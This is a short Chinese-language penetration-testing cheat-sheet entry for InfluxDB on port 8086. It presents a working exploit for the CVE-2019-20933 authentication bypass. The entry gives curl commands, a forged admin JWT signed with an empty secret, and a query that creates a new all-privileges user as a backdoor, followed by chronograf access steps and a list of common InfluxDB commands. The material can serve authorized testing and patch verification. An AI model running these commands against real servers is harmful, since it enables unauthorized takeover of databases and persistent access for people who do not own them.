# 8086 InfluxDB

## 未授权访问 (CVE-2019-20933)

```bash
HOST=; PORT=8086; # TARGET HOST INFO
URL=http://$HOST:$PORT;
curl $URL/debug/vars
```

使用 [https://jwt.io/](https://jwt.io/) 生成 Token。HEADER 和 PAYLOAD 如下所示，VERIFY SIGNATURE 设置为空。

```bash
# HEADER: ALGORITHM & TOKEN TYPE
{
  "alg": "HS256",
  "typ": "JWT"
}
# PAYLOAD
{
  "username": "admin",
  "exp": 2986346267
}
```

通过 curl 命令可以直接验证漏洞（也可以添加 HTTP Header 自行访问）。

```bash
AUTH="Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoyOTg2MzQ2MjY3fQ.LJDvEy5zvSEpA_C6pnK3JJFkUKGq9eEi8T2wdum3R_s"
BODY=q="CREATE USER \"influx\" with PASSWORD '123456' WITH ALL PRIVILEGES;"
curl -X POST -H $AUTH -d $BODY $URL/query
# 返回结果中如果包含 {"results":[{"statement_id":0}]} 字段则代表用户添加成功
```

成功添加用户后可以使用图形化工具 [chronograf](https://github.com/influxdata/chronograf) 操作数据库。

```bash
# 运行命令后访问 localhost:8888
URL=http://$HOST:$PORT;
chronograf --influxdb-url="$URL" --influxdb-username="influx" --influxdb-password="123456"
```

## InfluxDB 常用命令

```bash
显示所有数据库: show atabases
显示所有用户: show users
显示所有 measurements: show measurements
创建用户: create user "influx" with password 'password' with all privileges;
创建数据库: create database “db_name”
删除数据库: drop database “db_name”
使用数据库: use db_name
查询 measurement_name 表的前十条数据: select * from measurement_name limit 10
```
